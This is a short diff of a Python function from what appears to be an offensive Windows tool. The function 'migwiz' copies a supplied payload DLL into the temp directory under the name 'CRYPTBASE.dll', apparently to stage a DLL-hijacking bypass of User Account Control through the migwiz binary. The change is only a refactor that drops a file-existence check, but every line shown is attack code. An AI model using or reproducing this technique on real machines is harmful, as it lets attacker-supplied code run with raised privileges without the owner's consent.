@@ -17,18 +17,17 @@ migwiz_info = {
 
 def migwiz(payload):
 	if (payloads().dll(payload) == True):
-		if (os.path.isfile(os.path.join(payload)) == True):
-			try:
-				payload_data = open(os.path.join(payload),"rb").read()
-			except Exception as error:
-				return False
+		try:
+			payload_data = open(os.path.join(payload),"rb").read()
+		except Exception as error:
+			return False
 
-			try:
-				dll_file = open(os.path.join(tempfile.gettempdir(),"CRYPTBASE.dll"),"wb")
-				dll_file.write(payload_data)
-				dll_file.close()
-			except Exception as error:
-				return False
+		try:
+			dll_file = open(os.path.join(tempfile.gettempdir(),"CRYPTBASE.dll"),"wb")
+			dll_file.write(payload_data)
+			dll_file.close()
+		except Exception as error:
+			return False
 
 		time.sleep(5)
 
